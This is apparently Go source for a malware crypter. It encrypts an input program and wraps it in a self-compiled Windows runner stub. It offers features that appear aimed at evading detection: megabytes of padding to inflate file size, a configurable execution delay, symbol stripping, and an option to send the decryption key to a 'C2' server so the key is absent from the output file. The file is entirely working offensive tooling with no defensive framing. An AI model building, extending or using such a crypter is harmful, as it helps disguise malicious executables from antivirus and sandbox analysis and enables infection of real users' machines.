package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	_ "embed"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

//go:embed runner.src
var runnerSource []byte

const magic = "HBX1"

type metadata struct {
	Key           string  `json:"key,omitempty"`
	Nonce         string  `json:"nonce,omitempty"`
	KeyID         string  `json:"key_id,omitempty"`
	C2URL         string  `json:"c2_url,omitempty"`
	Delay         float64 `json:"delay"`
	OriginalName  string  `json:"original_name"`
	OriginalSize  int     `json:"original_size"`
	CiphertextLen int     `json:"ciphertext_len"`
}

func encryptAndBuild(inputPath, outputPath string, addSizeMB, delay float64, c2url string) error {
	plaintext, err := os.ReadFile(inputPath)
	if err != nil {
		return fmt.Errorf("cannot read %s: %w", inputPath, err)
	}

	key := make([]byte, 32)
	nonce := make([]byte, 12)
	rand.Read(key)
	rand.Read(nonce)

	block, err := aes.NewCipher(key)
	if err != nil {
		return fmt.Errorf("aes: %w", err)
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return fmt.Errorf("gcm: %w", err)
	}
	ciphertext := gcm.Seal(nil, nonce, plaintext, []byte(magic))

	meta := metadata{
		Delay:         delay,
		OriginalName:  filepath.Base(inputPath),
		OriginalSize:  len(plaintext),
		CiphertextLen: len(ciphertext),
	}

	c2url = strings.TrimRight(c2url, "/")

	if c2url != "" {
		keyID, err := sendKeyToServer(c2url, key, nonce)
		if err != nil {
			return fmt.Errorf("key server: %w", err)
		}
		meta.KeyID = keyID
		meta.C2URL = c2url
		fmt.Printf("[INFO] Key sent to server: key_id=%s\n", keyID)
		fmt.Printf("[INFO] Key is NOT stored in the output file.\n")
	} else {
		meta.Key = base64.StdEncoding.EncodeToString(key)
		meta.Nonce = base64.StdEncoding.EncodeToString(nonce)
		fmt.Println("[INFO] Key stored in file (no --c2-url specified).")
	}

	metaJSON, _ := json.Marshal(meta)

	fmt.Println("[INFO] Compiling runner stub for windows/amd64 ...")
	stub, err := compileRunner()
	if err != nil {
		return fmt.Errorf("compile runner: %w", err)
	}

	paddingSize := int(addSizeMB * 1024 * 1024)

	metaLenBuf := make([]byte, 4)
	binary.BigEndian.PutUint32(metaLenBuf, uint32(len(metaJSON)))

	out, err := os.OpenFile(outputPath, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0o755)
	if err != nil {
		return err
	}
	defer out.Close()

	out.Write(stub)
	writePadding(out, paddingSize)
	out.Write(ciphertext)
	out.Write(metaJSON)
	out.Write(metaLenBuf)
	out.Write([]byte(magic))

	totalSize := len(stub) + paddingSize + len(ciphertext) + len(metaJSON) + 8

	fmt.Printf("[OK] Encryption is successful! Encrypted binary saved as %q.\n", outputPath)
	fmt.Printf("[INFO] Input:       %s\n", inputPath)
	fmt.Printf("[INFO] Runner:      %s\n", outputPath)
	fmt.Printf("[INFO] Added size:  %.0f MB\n", addSizeMB)
	fmt.Printf("[INFO] Delay:       %.0f second(s)\n", delay)
	fmt.Printf("[INFO] Runner size: %d bytes (%.1f MB)\n", totalSize, float64(totalSize)/(1024*1024))
	return nil
}

type storeKeyRequest struct {
	Key   string `json:"key"`
	Nonce string `json:"nonce"`
}

type storeKeyResponse struct {
	KeyID string `json:"key_id"`
}

func sendKeyToServer(c2url string, key, nonce []byte) (string, error) {
	body, _ := json.Marshal(storeKeyRequest{
		Key:   base64.StdEncoding.EncodeToString(key),
		Nonce: base64.StdEncoding.EncodeToString(nonce),
	})

	resp, err := http.Post(c2url+"/keys", "application/json", bytes.NewReader(body))
	if err != nil {
		return "", fmt.Errorf("cannot reach key server at %s: %w", c2url, err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("key server returned %d", resp.StatusCode)
	}

	var result storeKeyResponse
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return "", fmt.Errorf("bad response from key server: %w", err)
	}
	return result.KeyID, nil
}

func compileRunner() ([]byte, error) {
	tmpDir, err := os.MkdirTemp("", "hbx-build-")
	if err != nil {
		return nil, err
	}
	defer os.RemoveAll(tmpDir)

	if err := os.WriteFile(filepath.Join(tmpDir, "main.go"), runnerSource, 0o644); err != nil {
		return nil, err
	}
	if err := os.WriteFile(filepath.Join(tmpDir, "go.mod"), []byte("module runner\n\ngo 1.21\n"), 0o644); err != nil {
		return nil, err
	}

	outPath := filepath.Join(tmpDir, "runner.exe")
	cmd := exec.Command("go", "build", "-o", outPath, "-ldflags", "-s -w", ".")
	cmd.Dir = tmpDir
	cmd.Env = append(os.Environ(), "GOOS=windows", "GOARCH=amd64", "CGO_ENABLED=0")

	if out, err := cmd.CombinedOutput(); err != nil {
		return nil, fmt.Errorf("go build failed:\n%s\n%w", string(out), err)
	}
	return os.ReadFile(outPath)
}

func writePadding(f *os.File, n int) {
	buf := make([]byte, 32*1024)
	for n > 0 {
		chunk := n
		if chunk > len(buf) {
			chunk = len(buf)
		}
		f.Write(buf[:chunk])
		n -= chunk
	}
}
